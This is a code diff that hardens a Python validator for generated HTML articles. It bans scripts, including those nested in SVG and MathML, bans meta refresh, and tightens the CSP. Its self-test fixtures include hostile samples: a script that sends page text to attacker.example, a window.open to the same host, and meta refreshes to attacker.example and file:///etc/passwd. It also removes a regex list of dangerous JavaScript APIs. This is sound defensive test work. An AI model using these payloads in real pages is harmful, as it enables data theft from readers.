@@ -34,26 +34,13 @@ FORBIDDEN_TAGS = {
     "iframe",
     "object",
     "portal",
+    "script",
 }
-SVG_FORBIDDEN_TAGS = {"animate", "animatemotion", "animatetransform", "discard", "foreignobject", "set"}
+SVG_FORBIDDEN_TAGS = {"animate", "animatemotion", "animatetransform", "discard", "foreignobject", "script", "set"}
+MATHML_FORBIDDEN_TAGS = {"script"}
 URL_ATTRS = {"action", "cite", "data", "formaction", "href", "poster", "src", "xlink:href"}
 REMOTE_ASSET_TAGS = {"audio", "embed", "iframe", "image", "img", "link", "object", "script", "source", "track", "video"}
 ALLOWED_NAV_SCHEMES = {"http", "https", "mailto", "tel"}
-DANGEROUS_JS_PATTERNS = {
-    "innerHTML": re.compile(r"\binnerHTML\b", re.I),
-    "outerHTML": re.compile(r"\bouterHTML\b", re.I),
-    "insertAdjacentHTML": re.compile(r"\binsertAdjacentHTML\b", re.I),
-    "document.write": re.compile(r"\bdocument\s*\.\s*write(?:ln)?\s*\(", re.I),
-    "eval": re.compile(r"\beval\s*\(", re.I),
-    "Function constructor": re.compile(r"\bnew\s+Function\b|\bFunction\s*\(", re.I),
-    "string timer": re.compile(r"\bset(?:Timeout|Interval)\s*\(\s*['\"]", re.I),
-    "fetch": re.compile(r"\bfetch\s*\(", re.I),
-    "XMLHttpRequest": re.compile(r"\bXMLHttpRequest\b", re.I),
-    "WebSocket": re.compile(r"\bWebSocket\b", re.I),
-    "EventSource": re.compile(r"\bEventSource\b", re.I),
-    "sendBeacon": re.compile(r"\bsendBeacon\s*\(", re.I),
-    "dynamic import": re.compile(r"\bimport\s*\(", re.I),
-}
 PLACEHOLDER_RE = re.compile(r"\{\{[A-Z][A-Z0-9_]*\}\}")
 
 
@@ -85,6 +72,7 @@ class ArticleAuditParser(html.parser.HTMLParser):
         self._in_script = 0
         self._in_title = 0
         self.svg_depth = 0
+        self.mathml_depth = 0
         self.svgs: list[dict[str, object]] = []
         self._svg_stack: list[int] = []
         self.tables: list[dict[str, object]] = []
@@ -109,6 +97,8 @@ class ArticleAuditParser(html.parser.HTMLParser):
             self.errors.append(f"forbidden tag: <{lower}>")
         if self.svg_depth and lower in SVG_FORBIDDEN_TAGS:
             self.errors.append(f"forbidden active SVG tag: <{lower}>")
+        if self.mathml_depth and lower in MATHML_FORBIDDEN_TAGS:
+            self.errors.append(f"forbidden active MathML tag: <{lower}>")
         for name in attr_map:
             if name.startswith("on"):
                 self.errors.append(f"inline event handler is forbidden: {lower}.{name}")
@@ -118,8 +108,11 @@ class ArticleAuditParser(html.parser.HTMLParser):
         if lower == "html":
             self.html_lang = attr_map.get("lang", "").strip()
         elif lower == "meta":
-            if attr_map.get("http-equiv", "").lower() == "content-security-policy":
+            http_equiv = attr_map.get("http-equiv", "").strip().lower()
+            if http_equiv == "content-security-policy":
                 self.csp = attr_map.get("content", "")
+            elif http_equiv == "refresh":
+                self.errors.append("meta refresh is forbidden")
             if attr_map.get("name", "").lower() == "viewport":
                 self.viewport = attr_map.get("content", "")
             if attr_map.get("name", "").lower() == "color-scheme":
@@ -145,6 +138,9 @@ class ArticleAuditParser(html.parser.HTMLParser):
         element_id = attr_map.get("id", "")
         if element_id:
             self.ids.append(element_id)
+
+        if lower == "math":
+            self.mathml_depth += 1
 
         if lower == "svg":
             svg = {
@@ -206,6 +202,8 @@ class ArticleAuditParser(html.parser.HTMLParser):
             self.svg_depth -= 1
             if self._svg_stack:
                 self._svg_stack.pop()
+        elif lower == "math" and self.mathml_depth:
+            self.mathml_depth -= 1
         elif lower == "table" and self._table_stack:
             self._table_stack.pop()
         if lower in {"button", "select", "textarea"} and self._control_stack:
@@ -358,6 +356,12 @@ def validate_assets() -> list[str]:
             errors.append(f"template missing placeholder: {placeholder}")
     if "Content-Security-Policy" not in template:
         errors.append("template is missing CSP")
+    if "script-src 'none'" not in template:
+        errors.append("template CSP must deny scripts")
+    if re.search(r"<script\b", template, re.I):
+        errors.append("template must not contain a script element")
+    if re.search(r"http-equiv\s*=\s*['\"]?refresh", template, re.I):
+        errors.append("template must not contain meta refresh")
     if "assets/styles/base.css" not in template or "assets/styles/manifest.json" not in template:
         errors.append("template does not document CSS inlining order")
     legacy = SKILL_ROOT / "references" / "template.html"
@@ -439,6 +443,12 @@ def validate_assets() -> list[str]:
                 marker = f'data-article-style="{style_name}"'
                 if marker not in example_text:
                     errors.append(f"example for {style_name!r} is missing {marker}")
+                if "script-src 'none'" not in example_text:
+                    errors.append(f"example for {style_name!r} must deny scripts in its CSP")
+                if re.search(r"<script\b", example_text, re.I):
+                    errors.append(f"example for {style_name!r} must not contain scripts")
+                if re.search(r"http-equiv\s*=\s*['\"]?refresh", example_text, re.I):
+                    errors.append(f"example for {style_name!r} must not contain meta refresh")
                 for css_name in record["css"]:
                     css_text = (STYLES / css_name).read_text(encoding="utf-8")
                     if css_text not in example_text:
@@ -461,8 +471,8 @@ def validate_csp(csp: str | None) -> list[str]:
             errors.append(f"CSP {name} must be exactly 'none'")
     if directives.get("style-src") != ["'unsafe-inline'"]:
         errors.append("CSP style-src must allow only 'unsafe-inline'")
-    if directives.get("script-src") != ["'unsafe-inline'"]:
-        errors.append("CSP script-src must allow only 'unsafe-inline'")
+    if directives.get("script-src") != ["'none'"]:
+        errors.append("CSP script-src must be exactly 'none'")
     for name in ("img-src", "media-src"):
         values = directives.get(name)
         if values not in (["data:"], ["'none'"]):
@@ -515,10 +525,8 @@ def validate_generated_html(path: Path, expected_style: str | None = None) -> li
     if re.search(r"prefers-color-scheme|\.dark\b|data-theme\s*=|theme-toggle", css, re.I):
         errors.append("dark-mode behavior is forbidden")
 
-    script = "\n".join(parser.scripts)
-    for label, pattern in DANGEROUS_JS_PATTERNS.items():
-        if pattern.search(script):
-            errors.append(f"dangerous JavaScript API is forbidden: {label}")
+    if parser.scripts or parser.counts.get("script", 0):
+        errors.append("generated documents must not contain scripts")
 
     if len(set(parser.ids)) != len(parser.ids):
         duplicates = sorted({value for value in parser.ids if parser.ids.count(value) > 1})
@@ -664,7 +672,44 @@ def render_screenshot(chrome: str, html_path: Path, screenshot: Path, width: int
     return None
 
 
-def make_minimal_html(body: str, *, style: str = "xju-notion", extra_head: str = "", script: str = "") -> str:
+def validate_and_render(
+    html_path: Path,
+    expected_style: str | None,
+    desktop_screenshot: str | None,
+    mobile_screenshot: str | None,
+    *,
+    chrome_finder=find_chrome,
+    renderer=render_screenshot,
+) -> tuple[list[str], list[Path]]:
+    errors = validate_generated_html(html_path, expected_style)
+    rendered: list[Path] = []
+    if errors:
+        return errors, rendered
+
+    requested = [value for value in (desktop_screenshot, mobile_screenshot) if value]
+    if not requested:
+        return errors, rendered
+
+    chrome = chrome_finder()
+    if not chrome:
+        return ["Linux Chrome/Chromium was not found for screenshots"], rendered
+
+    for value, width, height in (
+        (desktop_screenshot, 1440, 1200),
+        (mobile_screenshot, 500, 844),
+    ):
+        if not value:
+            continue
+        screenshot = Path(value).expanduser().resolve()
+        error = renderer(chrome, html_path, screenshot, width, height)
+        if error:
+            errors.append(error)
+        else:
+            rendered.append(screenshot)
+    return errors, rendered
+
+
+def make_minimal_html(body: str, *, style: str = "xju-notion", extra_head: str = "") -> str:
     base = (STYLES / "base.css").read_text(encoding="utf-8")
     profile = (STYLES / f"{style}.css").read_text(encoding="utf-8")
     return f'''<!DOCTYPE html>
@@ -673,7 +718,7 @@ def make_minimal_html(body: str, *, style: str = "xju-notion", extra_head: str =
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <meta name="color-scheme" content="light" />
-<meta http-equiv="Content-Security-Policy" content="default-src 'none'; base-uri 'none'; connect-src 'none'; font-src 'none'; frame-src 'none'; img-src data:; media-src data:; object-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; form-action 'none'; frame-ancestors 'none'" />
+<meta http-equiv="Content-Security-Policy" content="default-src 'none'; base-uri 'none'; connect-src 'none'; font-src 'none'; frame-src 'none'; img-src data:; media-src data:; object-src 'none'; script-src 'none'; style-src 'unsafe-inline'; form-action 'none'; frame-ancestors 'none'" />
 <title>Fixture</title>
 {extra_head}
 <style>{base}\n{profile}</style>
@@ -681,7 +726,6 @@ def make_minimal_html(body: str, *, style: str = "xju-notion", extra_head: str =
 <body>
 <a class="skip-link" href="#main-content">Skip to content</a>
 <main id="main-content"><article class="doc">{body}</article></main>
-{script}
 </body>
 </html>'''
 
@@ -695,25 +739,68 @@ def run_self_test() -> list[str]:
         ("inline-handler", valid_body + '<button aria-label="Bad" onclick="alert(1)">Bad</button>', "inline event handler"),
         ("unsafe-tag", valid_body + '<iframe src="data:text/html,bad"></iframe>', "forbidden tag"),
         ("unsafe-form", valid_body + '<form><button>Submit</button></form>', "forbidden tag"),
-        ("dangerous-sink", valid_body, "dangerous JavaScript API"),
-        ("network-api", valid_body, "dangerous JavaScript API"),
         ("missing-alt", valid_body + '<img src="data:image/png;base64,iVBORw0KGgo=" />', "missing alt"),
         ("heading-order", '<h1>Fixture</h1><section><h3>Skipped</h3></section>', "invalid heading order"),
         ("duplicate-id", '<h1 id="same">Fixture</h1><section id="same"><h2>Section</h2></section>', "duplicate ids"),
         ("unlabeled-svg", valid_body + '<svg role="img" viewBox="0 0 10 10"></svg>', "requires titled"),
         ("unscoped-table", valid_body + '<div class="table-wrap"><table aria-label="Bad"><tr><th>A</th><td>B</td></tr></table></div>', "valid scope"),
         ("raw-source-html", valid_body + '<object data="data:text/html,bad"></object>', "forbidden tag"),
+        ("dangerous-sink", valid_body + "<script>document.body.innerHTML = '<p>bad</p>';</script>", "forbidden tag"),
+        ("network-api", valid_body + "<script>fetch('https://example.com');</script>", "forbidden tag"),
+        ("arbitrary-script", valid_body + "<script>document.title = 'ran';</script>", "forbidden tag"),
+        (
+            "location-navigation",
+            valid_body + "<script>location.href = 'https://attacker.example/?d=' + encodeURIComponent(document.body.innerText);</script>",
+            "forbidden tag",
+        ),
+        ("window-open-navigation", valid_body + "<script>window.open('https://attacker.example/');</script>", "forbidden tag"),
+        (
+            "svg-script",
+            valid_body + '<svg aria-hidden="true"><script>document.title="ran"</script></svg>',
+            "forbidden active SVG tag",
+        ),
+        (
+            "mathml-script",
+            valid_body + '<math><mtext><script>document.title="ran"</script></mtext></math>',
+            "forbidden active MathML tag",
+        ),
+        (
+            "mathml-integration-script",
+            valid_body + '<math><annotation-xml encoding="text/html"><svg aria-hidden="true"><script>document.title="ran"</script></svg></annotation-xml></math>',
+            "forbidden active",
+        ),
+        (
+            "meta-refresh-http",
+            valid_body,
+            "meta refresh is forbidden",
+        ),
+        (
+            "meta-refresh-file",
+            valid_body,
+            "meta refresh is forbidden",
+        ),
+        (
+            "meta-refresh-protocol-relative",
+            valid_body,
+            "meta refresh is forbidden",
+        ),
+        (
+            "meta-refresh-data",
+            valid_body,
+            "meta refresh is forbidden",
+        ),
     ]
+    refresh_heads = {
+        "meta-refresh-http": '<meta http-equiv="refresh" content="0;url=https://attacker.example/" />',
+        "meta-refresh-file": '<meta http-equiv="refresh" content="0;url=file:///etc/passwd" />',
+        "meta-refresh-protocol-relative": '<meta http-equiv="refresh" content="0;url=//attacker.example/" />',
+        "meta-refresh-data": '<meta http-equiv="refresh" content="0;url=data:text/html,bad" />',
+    }
     with tempfile.TemporaryDirectory(prefix="article-html-self-test-") as temp_dir:
         temp = Path(temp_dir)
         for name, body, expected in cases:
-            script = ""
-            if name == "dangerous-sink":
-                script = "<script>document.body.innerHTML = '<p>bad</p>';</script>"
-            if name == "network-api":
-                script = "<script>fetch('https://example.com');</script>"
             path = temp / f"{name}.html"
-            path.write_text(make_minimal_html(body, script=script), encoding="utf-8")
+            path.write_text(make_minimal_html(body, extra_head=refresh_heads.get(name, "")), encoding="utf-8")
             errors = validate_generated_html(path)
             if not errors:
                 failures.append(f"negative self-test {name!r} unexpectedly passed")
@@ -725,6 +812,33 @@ def run_self_test() -> list[str]:
         valid_errors = validate_generated_html(valid_path)
         if valid_errors:
             failures.append(f"positive self-test failed: {valid_errors}")
+
+        invalid_path = temp / "invalid-screenshot.html"
+        invalid_path.write_text(
+            make_minimal_html(valid_body + "<script>document.title = 'ran';</script>"),
+            encoding="utf-8",
+        )
+        render_calls: list[tuple[str, Path, Path, int, int]] = []
+
+        def fail_if_chrome_is_requested() -> str:
+            failures.append("invalid screenshot self-test attempted to locate Chrome")
+            return "unused"
+
+        def record_render(chrome: str, html_path: Path, screenshot: Path, width: int, height: int) -> None:
+            render_calls.append((chrome, html_path, screenshot, width, height))
+
+        screenshot_errors, screenshots = validate_and_render(
+            invalid_path,
+            None,
+            str(temp / "must-not-render.png"),
+            None,
+            chrome_finder=fail_if_chrome_is_requested,
+            renderer=record_render,
+        )
+        if not screenshot_errors:
+            failures.append("invalid screenshot self-test unexpectedly passed validation")
+        if render_calls or screenshots:
+            failures.append("invalid screenshot self-test launched the renderer")
     return failures
 
 
@@ -767,26 +881,12 @@ def main() -> int:
             print("Validator self-test: OK")
     if args.input:
         html_path = Path(args.input).expanduser().resolve()
-        errors = validate_generated_html(html_path, args.style)
-        rendered: list[Path] = []
-        requested_screenshots = [value for value in (args.screenshot, args.mobile_screenshot) if value]
-        if requested_screenshots:
-            chrome = find_chrome()
-            if not chrome:
-                errors.append("Linux Chrome/Chromium was not found for screenshots")
-            else:
-                for value, width, height in (
-                    (args.screenshot, 1440, 1200),
-                    (args.mobile_screenshot, 500, 844),
-                ):
-                    if not value:
-                        continue
-                    screenshot = Path(value).expanduser().resolve()
-                    error = render_screenshot(chrome, html_path, screenshot, width, height)
-                    if error:
-                        errors.append(error)
-                    else:
-                        rendered.append(screenshot)
+        errors, rendered = validate_and_render(
+            html_path,
+            args.style,
+            args.screenshot,
+            args.mobile_screenshot,
+        )
         if errors:
             failures += 1
             print_errors(f"HTML validation for {html_path}", errors)
